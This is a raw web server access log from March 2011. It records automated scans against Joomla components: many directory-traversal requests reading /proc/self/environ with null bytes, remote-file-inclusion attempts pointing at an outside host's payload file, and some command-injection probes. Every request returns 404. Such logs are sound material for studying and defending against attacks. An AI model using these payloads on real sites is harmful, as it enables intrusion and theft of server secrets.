213.251.169.85 - - [21/Mar/2011:06:51:17 +0900] "GET /index.php?option=com_travelbook&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
174.121.216.196 - - [21/Mar/2011:06:51:42 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
216.119.135.66 - - [21/Mar/2011:06:52:05 +0900] "GET /access_log.last//index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
216.119.135.66 - - [21/Mar/2011:06:52:05 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
122.201.102.78 - - [21/Mar/2011:06:53:16 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:53:16 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:53:17 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:53:17 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
206.188.206.78 - - [21/Mar/2011:06:53:38 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
174.121.216.196 - - [21/Mar/2011:06:55:23 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:55:55 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 232
122.201.102.78 - - [21/Mar/2011:06:55:55 +0900] "GET //index.php?option=com_joomlapicasa2&controller=http://www.roundabouthouse.co.uk/id/dedhy/Ckrid1.txt?? HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:55:55 +0900] "GET //index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 216
122.201.102.78 - - [21/Mar/2011:06:55:55 +0900] "GET /access_log.last//index.php?option=com_joomlapicasa2&controller=%7Cecho%20%22casper%22;echo%20%22kae%22;%7C HTTP/1.1" 404 232
216.246.89.162 - - [21/Mar/2011:06:56:11 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.105 - - [21/Mar/2011:06:56:30 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:06:56:32 +0900] "GET //index.php?option=com_ckforms&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:06:56:53 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:59:00 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.119.140.66 - - [21/Mar/2011:06:59:11 +0900] "GET //index2.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
76.97.16.122 - - [21/Mar/2011:06:59:39 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:06:59:42 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:00:04 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:07:00:31 +0900] "GET /access_log.last//index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:07:00:34 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
216.119.140.66 - - [21/Mar/2011:07:01:20 +0900] "GET //index2.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
67.210.98.105 - - [21/Mar/2011:07:02:09 +0900] "GET /access_log//index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 227
67.210.98.105 - - [21/Mar/2011:07:02:09 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:07:07:08 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:07:08:40 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.105 - - [21/Mar/2011:07:08:55 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:07:09:05 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
112.216.153.186 - - [21/Mar/2011:07:09:47 +0900] "GET //index2.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 217
62.212.74.150 - - [21/Mar/2011:07:10:21 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
62.212.74.150 - - [21/Mar/2011:07:10:22 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
95.229.208.133 - - [21/Mar/2011:07:10:22 +0900] "GET /access_log.last//index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
62.212.74.150 - - [21/Mar/2011:07:10:24 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
62.212.74.150 - - [21/Mar/2011:07:10:25 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
95.229.208.133 - - [21/Mar/2011:07:10:26 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.212.74.150 - - [21/Mar/2011:07:10:44 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:07:10:49 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
91.121.147.225 - - [21/Mar/2011:07:10:50 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:07:10:51 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
91.121.147.225 - - [21/Mar/2011:07:10:52 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:07:10:55 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
91.121.147.225 - - [21/Mar/2011:07:10:55 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
62.212.74.150 - - [21/Mar/2011:07:10:56 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
62.212.74.150 - - [21/Mar/2011:07:10:56 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
109.123.86.244 - - [21/Mar/2011:07:10:57 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
213.251.169.85 - - [21/Mar/2011:07:10:57 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
213.251.169.85 - - [21/Mar/2011:07:10:58 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
109.123.86.244 - - [21/Mar/2011:07:10:58 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
213.251.169.85 - - [21/Mar/2011:07:11:05 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
213.251.169.85 - - [21/Mar/2011:07:11:06 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
213.251.169.85 - - [21/Mar/2011:07:11:06 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
213.251.169.85 - - [21/Mar/2011:07:11:06 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
213.251.169.85 - - [21/Mar/2011:07:11:07 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
213.251.169.85 - - [21/Mar/2011:07:11:08 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
95.229.208.133 - - [21/Mar/2011:07:11:34 +0900] "GET /access_log.last//index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:07:11:36 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.121.147.225 - - [21/Mar/2011:07:11:44 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
91.121.147.225 - - [21/Mar/2011:07:11:44 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:07:12:09 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
213.251.169.85 - - [21/Mar/2011:07:12:10 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
62.212.74.150 - - [21/Mar/2011:07:12:34 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
62.212.74.150 - - [21/Mar/2011:07:12:35 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
213.251.169.85 - - [21/Mar/2011:07:12:44 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
213.251.169.85 - - [21/Mar/2011:07:12:45 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
213.251.169.85 - - [21/Mar/2011:07:12:50 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
62.212.74.150 - - [21/Mar/2011:07:12:50 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.147.225 - - [21/Mar/2011:07:12:53 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
213.251.169.85 - - [21/Mar/2011:07:12:58 +0900] "GET /access_log.last/index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
213.251.169.85 - - [21/Mar/2011:07:12:58 +0900] "GET /index.php?option=com_spsnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
94.199.178.9 - - [21/Mar/2011:07:14:29 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:07:14:36 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:07:14:58 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:07:14:58 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:07:15:16 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:07:15:17 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.199.178.9 - - [21/Mar/2011:07:15:28 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:17:00 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:17:44 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:18:17 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:07:18:49 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
67.210.98.105 - - [21/Mar/2011:07:19:13 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:07:19:25 +0900] "GET /access_log.last//index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:07:19:26 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
216.246.89.162 - - [21/Mar/2011:07:20:23 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
95.229.208.133 - - [21/Mar/2011:07:21:15 +0900] "GET /access_log.last//index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
95.229.208.133 - - [21/Mar/2011:07:21:19 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:22:32 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:23:03 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:24:23 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:07:24:34 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
62.212.74.150 - - [21/Mar/2011:07:24:56 +0900] "GET /access_log/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 226
62.212.74.150 - - [21/Mar/2011:07:24:57 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
62.212.74.150 - - [21/Mar/2011:07:24:59 +0900] "GET /access_log/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 226
62.212.74.150 - - [21/Mar/2011:07:25:00 +0900] "GET /index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.64.167 - - [21/Mar/2011:07:25:10 +0900] "GET /access_log.last//index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 232
91.121.64.167 - - [21/Mar/2011:07:25:11 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
62.212.74.150 - - [21/Mar/2011:07:25:11 +0900] "GET /access_log.last/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
